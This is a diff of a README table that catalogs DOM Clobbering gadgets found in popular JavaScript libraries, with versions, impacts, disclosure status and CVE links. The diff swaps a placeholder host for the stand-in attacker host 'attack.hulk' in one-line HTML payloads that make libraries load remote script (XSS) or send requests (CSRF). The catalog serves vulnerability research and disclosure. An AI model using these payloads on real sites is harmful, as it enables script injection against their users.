@@ -15,7 +15,7 @@ We also recommend checking out the following great websites, papers, and blog po
 
 + Introductions:
   + The website [DOM Clobbering Wiki](https://domclob.xyz/) offers comprehensive information on attack techniques, vulnerability patterns, and defenses, along with tools for browser testing and payload generation.
-  + The blog post "[Can HTML affect JavaScript? Introduction to DOM clobbering](https://aszx87410.github.io/beyond-xss/en/ch3/dom-clobbering/)" explains how HTML elements can influence JavaScript execution through DOM Clobbering.
+  + The blog post "[Can HTML affect JavaScript? Introduction to DOM clobbering](https://aszx87410.github.io/beyond-xss/en/ch3/dom-clobbering/)" by Huli explains how HTML elements can influence JavaScript execution through DOM Clobbering.
 + Academic Papers:
   + The paper [It’s (DOM) Clobbering Time: Attack Techniques, Prevalence, and Defenses](https://publications.cispa.saarland/3756/1/sp23_domclob.pdf) by Soheil Khodayari and Giancarlo Pellegrino presents a systematic study of DOM Clobbering, uncovering various attack techniques, browser behaviors, and vulnerable code patterns, and evaluates existing countermeasures.
   + The paper [The DOMino Effect: Detecting and Exploiting DOM Clobbering Gadgets via Concolic Execution with Symbolic DOM]() by Zhengyu Liu et al. introduces a dynamic analysis tool using symbolic DOM modeling and concolic execution to detect and exploit DOM Clobbering gadgets at scale.
@@ -31,31 +31,31 @@ We provide a website hosting Proof-of-Concept (PoC) pages for each DOM Clobberin
 
 | Library | Stars | Version | Payloads | Impact | Found By | Status | CVE |
 |:-------:|:-----:|:-------:|----------|:------:|:--------:|:------:|:---:|
-| [Vite](./domc-gadgets/vite.md) | 67.2K | v5.4.5 | ```<img src="https://xxx.xxx.xxx" name="currentScript">``` | XSS | TheHulk | Patched | CVE-2024-45812 |
-| [Webpack](./domc-gadgets/webpack.md) | 64.4K | v5.93.0 | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>``` | XSS | TheHulk | Patched | CVE-2024-43788 |
-| [Astro](./domc-gadgets/astro.md) | 45.7K | v4.5.9 | ```<form name="scripts">alert(1)</form><form name="scripts">alert(1)</form>``` | XSS | TheHulk | Fixed | CVE-2024-47885 |
-| [layui](./domc-gadgets/layui.md) | 29.5K | v2.9.16 | ```<img name="currentScript" src="https://xxx.xxx.xxx">``` | XSS | TheHulk | Patched | CVE-2024-47075 |
-| [rollup](./domc-gadgets/rollup.md) | 25.2K | v4.21.3 | ```<img src="https://xxx.xxx.xxx" name="currentScript">``` | XSS | TheHulk | Fixed | CVE-2024-47068 |
-| [plausible-analytics](./domc-gadgets/plausible-analytics.md) | 19.7K | v2.1.0 | ```<img name="currentScript" data-domain="xxx.xxx.xxx" data-api="https://xxx.xxx.xxx">``` | CSRF | TheHulk | Reported | N/A |
-| [plotly.js](./domc-gadgets/plotly.js.md) | 16.9K | v2.35.2 | ```<a id="PLOTLYENV"></a><a id="PLOTLYENV" name="BASE_URL" href="https://xxx.xxx.xxx/?a="></a>``` | CSRF | TheHulk | Reported | N/A |
-| [Prism](./domc-gadgets/prism.md) | 12.2K | v1.29.0 | ```<img name="currentScript" src="https://xxx.xxx.xxx/a.js"></img>``` | XSS | TheHulk | Reported | CVE-2024-53382 |
-| [MathJax](./domc-gadgets/mathjax2.md) | 10.1K | v2.7.x | ```<a id="MathJax"></a> <a id="MathJax" name="root" href="https://xxx.xxx.xxx"></a>``` | XSS | TheHulk | Accepted | N/A |
-| [MathJax](./domc-gadgets/mathjax3.md) | 10.1K | v3.2.2 | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img> $$\require{tex}$$``` | XSS | TheHulk | Accepted | N/A |
-| [tsup](./domc-gadgets/tsup.md) | 8.9K | v8.3.4 | ```<img src="https://xxx.xxx.xxx" name="currentScript">``` | XSS | TheHulk | Reported | CVE-2024-53384 |
-| [rspack](./domc-gadgets/rspack.md) | 8.6K | v1.0.0-rc.0 | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>``` | XSS | TheHulk | Fixed | CVE-2024-43788 |
-| [seajs](./domc-gadgets/seajs.md) | 8.3K | v3.0.3 | ```<img name="scripts" src="https://xxx.xxx.xxx"><img name="scripts" src="https://xxx.xxx.xxx">``` | XSS | TheHulk | Reported | CVE-2024-51091 |
-| [Google Closure](./domc-gadgets/google-closure-library.md) | 4.9K | v20230103 | ```<img name="currentScript" src="https://xxx.xxx.xxx/base.js"></img>``` | XSS | TheHulk | Accepted | N/A |
-| [pagefind](./domc-gadgets/pagefind.md) | 3.3K | v1.1.0 | ```<img name="currentScript" src="blob:https://xxx.xxx.xxx/ui.js"></img>``` | XSS | TheHulk | Accepted | CVE-2024-45389 |
-| [Mavo](./domc-gadgets/mavo.md) | 2.8K | v0.3.2 | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>``` | XSS | TheHulk | Reported | CVE-2024-53388 |
-| [cusdis](./domc-gadgets/cusdis.md) | 2.6K | v1.3.0 | ```<img name="currentScript" data-host="https://xxx.xxx.xxx">``` | XSS | TheHulk | Reported | CVE-2024-49213 |
-| [Stage.js](./domc-gadgets/stage.js.md) | 2.4K | 0.8.10 | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>``` | XSS | TheHulk | Reported | CVE-2024-53386 |
-| [curl](./domc-gadgets/curl.md) | 1.8K | v0.8.13 | ```<img name="scripts" data-curl-run="http://xxx.xxx.xxx/"><img name="scripts" data-curl-run="http://xxx.xxx.xxx">``` | XSS | TheHulk | Reported | CVE-2024-49212 |
-| [inspire.js](./domc-gadgets/inspire.js.md) | 1.7K | v1.10 | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>``` | XSS | TheHulk | Reported | CVE-2024-53385 |
-| [steal](./domc-gadgets/steal.md) | 1.4K | v2.3.0 | ```<img name="currentScript" src="https://xxx.xxx.xxx"><img>``` | XSS | TheHulk | Accepted | CVE-2024-45939 |
-| [UMeditor](./domc-gadgets/umeditor.md) | 1.4K | v1.2.2 | ```<a id="UMEDITOR_HOME_URL" href="https://xxx.xxx.xxx/"></a>``` | XSS | TheHulk | Reported | CVE-2024-53387 |
-| [squirt](./domc-gadgets/squirt.md) | 1.2K | v0.0.1 | ```<img name="scripts" src="http://xxx.xxx.xxx"><img name="scripts" src="http://xxx.xxx.xxx">``` | XSS | TheHulk | Reported | N/A |
-| [ckplayer](./domc-gadgets/ckplayer.md) | 1.1K | latest | ```<img name="scripts" src="https://xxx.xxx.xxx/js/"><img name="scripts" src="https://xxx.xxx.xxx/js/">``` | XSS | TheHulk | Reported | N/A |
-| [polyfills](./domc-gadgets/polyfills.md) | 1.1K | v2.8.0 | ```<a id="ShadyDOM"></a><a id="ShadyDOM" name="force"></a><a id="WebComponents"></a><a id="WebComponents" name="root" href="https://xxx.xxx.xxx"></a>``` | XSS | TheHulk | Reported | N/A |
+| [Vite](./domc-gadgets/vite.md) | 67.2K | v5.4.5 | ```<img src="https://attack.hulk" name="currentScript">``` | XSS | TheHulk | Patched | [CVE-2024-45812](https://nvd.nist.gov/vuln/detail/CVE-2024-45812) |
+| [Webpack](./domc-gadgets/webpack.md) | 64.4K | v5.93.0 | ```<img name="currentScript" src="https://attack.hulk"></img>``` | XSS | TheHulk | Patched | [CVE-2024-43788](https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986) |
+| [Astro](./domc-gadgets/astro.md) | 45.7K | v4.5.9 | ```<form name="scripts">alert(1)</form><form name="scripts">alert(1)</form>``` | XSS | TheHulk | Fixed | [CVE-2024-47885](https://github.com/withastro/astro/security/advisories/GHSA-m85w-3h95-hcf9) |
+| [layui](./domc-gadgets/layui.md) | 29.5K | v2.9.16 | ```<img name="currentScript" src="https://attack.hulk">``` | XSS | TheHulk | Patched | [CVE-2024-47075](https://github.com/layui/layui/security/advisories/GHSA-j827-6rgf-9629) |
+| [rollup](./domc-gadgets/rollup.md) | 25.2K | v4.21.3 | ```<img src="https://attack.hulk" name="currentScript">``` | XSS | TheHulk | Fixed | [CVE-2024-47068](https://github.com/advisories/GHSA-gcx4-mw62-g8wm) |
+| [plausible-analytics](./domc-gadgets/plausible-analytics.md) | 19.7K | v2.1.0 | ```<img name="currentScript" data-domain="attack.hulk" data-api="https://attack.hulk">``` | CSRF | TheHulk | Reported | N/A |
+| [plotly.js](./domc-gadgets/plotly.js.md) | 16.9K | v2.35.2 | ```<a id="PLOTLYENV"></a><a id="PLOTLYENV" name="BASE_URL" href="https://attack.hulk/?a="></a>``` | CSRF | TheHulk | Reported | N/A |
+| [Prism](./domc-gadgets/prism.md) | 12.2K | v1.29.0 | ```<img name="currentScript" src="https://attack.hulk/a.js"></img>``` | XSS | TheHulk | Reported | [CVE-2024-53382](https://nvd.nist.gov/vuln/detail/CVE-2024-53382) |
+| [MathJax](./domc-gadgets/mathjax2.md) | 10.1K | v2.7.x | ```<a id="MathJax"></a> <a id="MathJax" name="root" href="https://attack.hulk"></a>``` | XSS | TheHulk | Accepted | N/A |
+| [MathJax](./domc-gadgets/mathjax3.md) | 10.1K | v3.2.2 | ```<img name="currentScript" src="https://attack.hulk"></img> $$\require{tex}$$``` | XSS | TheHulk | Accepted | N/A |
+| [tsup](./domc-gadgets/tsup.md) | 8.9K | v8.3.4 | ```<img src="https://attack.hulk" name="currentScript">``` | XSS | TheHulk | Reported | CVE-2024-53384 |
+| [rspack](./domc-gadgets/rspack.md) | 8.6K | v1.0.0-rc.0 | ```<img name="currentScript" src="https://attack.hulk"></img>``` | XSS | TheHulk | Fixed | [CVE-2024-43788](https://nvd.nist.gov/vuln/detail/CVE-2024-43788) |
+| [seajs](./domc-gadgets/seajs.md) | 8.3K | v3.0.3 | ```<img name="scripts" src="https://attack.hulk"><img name="scripts" src="https://attack.hulk">``` | XSS | TheHulk | Reported | [CVE-2024-51091](https://nvd.nist.gov/vuln/detail/CVE-2024-51091) |
+| [Google Closure](./domc-gadgets/google-closure-library.md) | 4.9K | v20230103 | ```<img name="currentScript" src="https://attack.hulk/base.js"></img>``` | XSS | TheHulk | Accepted | N/A |
+| [pagefind](./domc-gadgets/pagefind.md) | 3.3K | v1.1.0 | ```<img name="currentScript" src="blob:https://attack.hulk/ui.js"></img>``` | XSS | TheHulk | Accepted | [CVE-2024-45389](https://nvd.nist.gov/vuln/detail/CVE-2024-45389) |
+| [Mavo](./domc-gadgets/mavo.md) | 2.8K | v0.3.2 | ```<img name="currentScript" src="https://attack.hulk"></img>``` | XSS | TheHulk | Reported | [CVE-2024-53388](https://nvd.nist.gov/vuln/detail/CVE-2024-53388) |
+| [cusdis](./domc-gadgets/cusdis.md) | 2.6K | v1.3.0 | ```<img name="currentScript" data-host="https://attack.hulk">``` | XSS | TheHulk | Reported | CVE-2024-49213 |
+| [Stage.js](./domc-gadgets/stage.js.md) | 2.4K | 0.8.10 | ```<img name="currentScript" src="https://attack.hulk"></img>``` | XSS | TheHulk | Reported | [CVE-2024-53386](https://nvd.nist.gov/vuln/detail/CVE-2024-53386) |
+| [curl](./domc-gadgets/curl.md) | 1.8K | v0.8.13 | ```<img name="scripts" data-curl-run="http://attack.hulk/"><img name="scripts" data-curl-run="http://attack.hulk">``` | XSS | TheHulk | Reported | CVE-2024-49212 |
+| [inspire.js](./domc-gadgets/inspire.js.md) | 1.7K | v1.10 | ```<img name="currentScript" src="https://attack.hulk"></img>``` | XSS | TheHulk | Reported | CVE-2024-53385 |
+| [steal](./domc-gadgets/steal.md) | 1.4K | v2.3.0 | ```<img name="currentScript" src="https://attack.hulk"><img>``` | XSS | TheHulk | Accepted | CVE-2024-45939 |
+| [UMeditor](./domc-gadgets/umeditor.md) | 1.4K | v1.2.2 | ```<a id="UMEDITOR_HOME_URL" href="https://attack.hulk/"></a>``` | XSS | TheHulk | Reported | [CVE-2024-53387](https://nvd.nist.gov/vuln/detail/CVE-2024-53387) |
+| [squirt](./domc-gadgets/squirt.md) | 1.2K | v0.0.1 | ```<img name="scripts" src="http://attack.hulk"><img name="scripts" src="http://attack.hulk">``` | XSS | TheHulk | Reported | N/A |
+| [ckplayer](./domc-gadgets/ckplayer.md) | 1.1K | latest | ```<img name="scripts" src="https://attack.hulk/js/"><img name="scripts" src="https://attack.hulk/js/">``` | XSS | TheHulk | Reported | N/A |
+| [polyfills](./domc-gadgets/polyfills.md) | 1.1K | v2.8.0 | ```<a id="ShadyDOM"></a><a id="ShadyDOM" name="force"></a><a id="WebComponents"></a><a id="WebComponents" name="root" href="https://attack.hulk"></a>``` | XSS | TheHulk | Reported | N/A |
 | [doomcaptcha](./domc-gadgets/doomcaptcha.md) | 1K | latest | ```<img name="currentScript" label="<script>alert(1)</script>"></img>``` | XSS | TheHulk | Reported | N/A |
 | [AddToAny](./domc-gadgets/addtoany.md) | N/A | N/A | ```<img src="https://addtoany.xxx.xxx" name="currentScript">``` | XSS | TheHulk | Patched | N/A |
 | [Google Client API](./domc-gadgets/google-client-api.md) | N/A | 5BIk7BglYEE | ```<iframe name="scripts" src=”https://apis.google.com/js/api.js”></iframe><iframe name="scripts" src=”https://apis.google.com/js/api.js”>alert(1)</iframe>``` | XSS | TheHulk | Patched | N/A |
